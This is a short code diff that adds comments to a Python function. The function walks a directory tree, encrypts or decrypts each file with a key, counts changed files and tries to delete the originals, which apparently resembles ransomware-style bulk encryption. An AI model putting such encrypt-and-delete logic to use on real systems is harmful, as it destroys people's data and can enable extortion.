@@ -125,7 +125,7 @@ def manage(function, rootDirectionary, key):#0 encrypt | 1 decrypt
             
                 
             if function == 0:    
-                    try:
+                    try:#attempts to encrypt the file
                         encrypt_file(key, filename, None, 64*1024)
                         filesChanged += 1
                         print(filesChanged)
@@ -143,7 +143,7 @@ def manage(function, rootDirectionary, key):#0 encrypt | 1 decrypt
                             print("cant delete :(")
                             unDeleteable += 1
             elif function == 1:
-                try:
+                try:#tries to decrypt the file
                     decrypt_file(key, filename, None, 64*1024)
                 except:
                     print("Permission denied")    
